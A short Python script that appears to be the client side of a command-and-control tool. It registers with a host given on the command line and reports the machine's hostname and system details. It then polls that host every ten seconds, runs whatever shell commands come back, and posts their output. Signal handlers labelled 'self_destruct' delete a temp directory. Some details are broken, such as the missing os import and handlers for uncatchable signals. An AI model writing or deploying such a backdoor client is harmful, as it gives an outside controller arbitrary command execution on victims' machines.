#!`which python`


import requests
import time
import json
import subprocess
import sys
import signal

session=requests.session()


def self_destruct(signum, frame):
    os.system('rm -rf /tmp/lolz')
    exit(0)

signal.signal(signal.SIGINT, self_destruct)
signal.signal(signal.SIGABRT, self_destruct)
signal.signal(signal.SIGSTOP, self_destruct)
signal.signal(signal.SIGKILL, self_destruct)


CLIENTNAME="`hostname`"
UNAME="`uname -a`"
HOST=sys.argv[1]
CLIENTID, KEY=json.loads(session.post('http://' + HOST + '/client/register',data={
    'clientname':CLIENTNAME,
    'uname':UNAME,
}).text)

def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    control=json.loads(session.post('http://'+HOST+'/client/get_pending', data={
        'clientname':CLIENTNAME,
        'uname':UNAME,
        'clientid':CLIENTID,
    }).text)

    response={
        commandid: do_cmd(command)
        for commandid, command in control
    }

    if len(response) > 0:
        session.post('http://'+HOST+'/client/submit_pending', data=response)
    
    time.sleep(10)
    

